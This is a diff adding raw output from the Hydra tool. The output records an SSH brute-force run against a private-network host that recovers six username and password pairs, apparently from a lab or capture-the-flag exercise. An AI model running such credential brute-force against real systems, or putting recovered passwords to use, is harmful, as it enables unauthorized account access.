@@ -1,0 +1,10 @@
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-08-17 03:50:45
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 140 login tries (l:14/p:10), ~35 tries per task
+[DATA] attacking ssh://10.0.2.6:22/
+[22][ssh] host: 10.0.2.6   login: brian   password: my2cents
+[22][ssh] host: 10.0.2.6   login: alice   password: turtles77
+[22][ssh] host: 10.0.2.6   login: leon   password: qwer1234
+[22][ssh] host: 10.0.2.6   login: julia   password: madrid
+[22][ssh] host: 10.0.2.6   login: michael   password: somepassword
+[22][ssh] host: 10.0.2.6   login: charles   password: chuck33
+
